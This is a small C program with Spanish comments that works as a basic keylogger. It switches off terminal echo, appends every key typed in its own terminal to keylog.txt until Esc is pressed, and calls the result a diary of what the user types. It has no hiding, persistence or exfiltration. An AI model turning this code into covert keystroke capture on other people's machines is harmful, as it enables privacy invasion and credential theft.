#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <fcntl.h>

// función para escribir las teclas en el archivo "keylog.txt"
// es como guardar un diario de lo que el usuario teclea jeje
void log_key(int key) {
    FILE *f = fopen("keylog.txt", "a");  // Abre el archivo en modo añadir
    if (f == NULL) {
        perror("No se pudo abrir el archivo, vaya lío");
        exit(1);  // Si no se puede abrir, salimos porque algo salió mal
    }
    fprintf(f, "%c", key);  // es para scribe el caracter en el archivo
    fclose(f);  
}

int main() {
    struct termios oldt, newt;  // estructuras para guardar la configuración de la terminal no queremos pase nada malo
    int ch;  // Aquí guardamos la tecla que se presiona

    // aquí desactivamos el buffer de la terminal para que lea las teclas 
    tcgetattr(STDIN_FILENO, &oldt);  // aqui guarda la config actual de la terminal
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);  // se quita el modo canónico y el eco (para que no se vea lo que escribes y no se espere un enter )
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);  // se aplicamos la nueva config de inmediato

    // bucle infinito para capturar las teclas - se queda corriendo hasta que presionas esc
    while (1) {
        ch = getchar();  // captura la tecla que se presiona
        log_key(ch);  // guarda la tecla presionada en el archivo
        if (ch == 27) {  // si presionas esc salimos del bucle
            break;
        }
    }

    // restaura la configuración de la terminal para que todo vuelva a la normalidad
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    return 0;  // todo salió bien regresamos 0
}




